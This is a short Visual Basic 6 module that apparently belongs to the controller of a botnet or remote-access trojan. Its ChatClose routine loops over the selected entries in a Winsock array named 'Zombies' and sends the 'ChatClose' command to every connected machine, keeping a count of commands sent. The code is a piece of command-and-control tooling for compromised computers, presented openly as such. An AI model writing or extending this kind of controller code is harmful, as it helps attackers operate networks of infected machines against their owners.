Attribute VB_Name = "Module1"
Dim data(1 To 600) As String
Dim sent As Integer
Dim checkeditem As Integer
Public Sub ChatClose()
Dim pckt$
sent = 0
For i = 1 To Form1.ListView1.ListItems.Count
If Form1.ListView1.ListItems.Item(i).Checked = True Then
pckt$ = "ChatClose"
If Form1.Zombies(i).State = 7 Then
Form1.Zombies(i).SendData pckt$
sent = sent + 1
Form1.ListView1.ColumnHeaders(2).text = "Status (" & sent & " Commands Sent)"


End If
End If
DoEvents
Next i
End Sub
